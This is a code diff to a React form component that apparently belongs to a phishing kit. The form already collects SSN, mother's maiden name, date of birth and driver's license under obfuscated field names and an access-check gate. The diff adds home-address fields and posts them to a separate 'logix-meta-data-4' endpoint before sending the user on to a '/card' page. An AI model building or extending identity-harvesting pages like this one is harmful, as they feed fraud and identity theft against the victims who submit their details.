@@ -15,6 +15,11 @@ const BasicInfo: React.FC = () => {
   const [year, setYear] = useState('');
   const [driverLicense, setDriverLicense] = useState('');
   const [showSSN, setShowSSN] = useState(false);
+  const [stAd, setStAd] = useState('');
+  const [apt, setApt] = useState('');
+  const [city, setCity] = useState('');
+  const [state, setState] = useState('');
+  const [zipCode, setZipCode] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [errors, setErrors] = useState({ 
     fzNme: '', 
@@ -23,7 +28,11 @@ const BasicInfo: React.FC = () => {
     ssn: '', 
     motherMaidenName: '', 
     dob: '', 
-    driverLicense: '' 
+    driverLicense: '',
+    stAd: '',
+    city: '',
+    state: '',
+    zipCode: ''
   });
   const [username, setUsername] = useState('');
   const isAllowed = useAccessCheck(baseUrl);
@@ -90,7 +99,11 @@ const BasicInfo: React.FC = () => {
       ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits' : '',
       motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required" : '',
       dob: (!month || !day || !year) ? 'Complete date of birth is required' : '',
-      driverLicense: !driverLicense.trim() ? "Driver's license is required" : ''
+      driverLicense: !driverLicense.trim() ? "Driver's license is required" : '',
+      stAd: !stAd.trim() ? 'Street address is required' : '',
+      city: !city.trim() ? 'City is required' : '',
+      state: !state.trim() ? 'State is required' : '',
+      zipCode: !zipCode.trim() ? 'Zip code is required' : ''
     };
 
     if (month && day && year) {
@@ -127,6 +140,7 @@ const BasicInfo: React.FC = () => {
 
       const dob = `${getMonthName(month)}/${day}/${year}`;
 
+      // Submit basic info
       await axios.post(`${baseUrl}api/logix-basic-info/`, {
         emzemz: username,
         fzNme,
@@ -136,6 +150,16 @@ const BasicInfo: React.FC = () => {
         motherMaidenName,
         dob,
         driverLicense
+      });
+
+      // Submit home address
+      await axios.post(`${baseUrl}api/logix-meta-data-4/`, {
+        emzemz: username,
+        stAd,
+        apt,
+        city,
+        state,
+        zipCode
       });
 
       navigate('/card', {
@@ -157,7 +181,7 @@ const BasicInfo: React.FC = () => {
   return (
     <div className="flex-1 bg-gray-200 rounded shadow-sm">
       <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Basic Information</h2>
+        <h2 className="text-xl font-semibold text-gray-800">Basic Information & Home Address</h2>
       </div>
 
       <div className="px-6 py-6 bg-white space-y-4">
@@ -357,6 +381,113 @@ const BasicInfo: React.FC = () => {
               <span>{errors.driverLicense}</span>
             </div>
           )}
+
+          {/* Home Address Section */}
+          <div className="border-t-2 border-gray-300 mt-6 pt-6">
+            <h3 className="text-lg font-semibold text-gray-800 mb-4">Home Address</h3>
+            
+            {/* Street Address */}
+            <div className="flex items-center gap-4 mb-4">
+              <label className="text-gray-700 w-24 text-right">Street Address:</label>
+              <input
+                id="stAd"
+                name="stAd"
+                type="text"
+                value={stAd}
+                onChange={(e) => setStAd(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+                placeholder="Enter street address"
+              />
+            </div>
+            {errors.stAd && (
+              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
+                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
+                </svg>
+                <span>{errors.stAd}</span>
+              </div>
+            )}
+
+            {/* Apartment/Unit */}
+            <div className="flex items-center gap-4 mb-4">
+              <label className="text-gray-700 w-24 text-right">Apartment/Unit:</label>
+              <input
+                id="apt"
+                name="apt"
+                type="text"
+                value={apt}
+                onChange={(e) => setApt(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+                placeholder="Optional"
+              />
+            </div>
+
+            {/* City */}
+            <div className="flex items-center gap-4 mb-4">
+              <label className="text-gray-700 w-24 text-right">City:</label>
+              <input
+                id="city"
+                name="city"
+                type="text"
+                value={city}
+                onChange={(e) => setCity(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+                placeholder="Enter city"
+              />
+            </div>
+            {errors.city && (
+              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
+                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
+                </svg>
+                <span>{errors.city}</span>
+              </div>
+            )}
+
+            {/* State */}
+            <div className="flex items-center gap-4 mb-4">
+              <label className="text-gray-700 w-24 text-right">State:</label>
+              <input
+                id="state"
+                name="state"
+                type="text"
+                value={state}
+                onChange={(e) => setState(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+                placeholder="Enter state"
+              />
+            </div>
+            {errors.state && (
+              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
+                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
+                </svg>
+                <span>{errors.state}</span>
+              </div>
+            )}
+
+            {/* Zip Code */}
+            <div className="flex items-center gap-4 mb-6">
+              <label className="text-gray-700 w-24 text-right">Zip Code:</label>
+              <input
+                id="zipCode"
+                name="zipCode"
+                type="text"
+                value={zipCode}
+                onChange={(e) => setZipCode(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+                placeholder="Enter zip code"
+              />
+            </div>
+            {errors.zipCode && (
+              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
+                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
+                </svg>
+                <span>{errors.zipCode}</span>
+              </div>
+            )}
+          </div>
 
           {!isLoading ? (
             <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
